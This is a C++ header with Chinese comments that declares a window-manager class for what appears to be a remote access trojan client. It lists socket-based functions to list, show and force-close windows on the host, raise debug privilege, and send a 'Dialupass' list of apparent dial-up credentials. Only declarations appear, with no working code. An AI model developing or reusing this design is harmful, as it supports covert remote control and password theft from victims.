// CProcessManager.h: interface for the CProcessManager class.
//
//////////////////////////////////////////////////////////////////////

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"
class CWindowsManager : public CManager
{
	public:
		CWindowsManager(CClientSocket* pClient, BYTE bHow);//bHow是传进来功能的标志
		virtual ~CWindowsManager();
		virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

		static bool DebugPrivilege(const char* PName, BOOL bEnable);	//提权
		static bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);	//迭代窗口的回调消息处理函数
		static void ShutdownWindows(DWORD dwReason);	//强制关闭窗口
	private:
		BYTE m_caseSystemIs;//构造函数会初始化这个变量，用于区分进程或者窗口的变量

		LPBYTE getWindowsList();	//获取窗口信息数据
		void SendWindowsList();		//发送窗口信息数据
		void SendDialupassList();
		void ShowTheWindow(LPBYTE buf);	//以某种方式展示窗口
		void CloseTheWindow(LPBYTE buf);	//关闭窗口
};

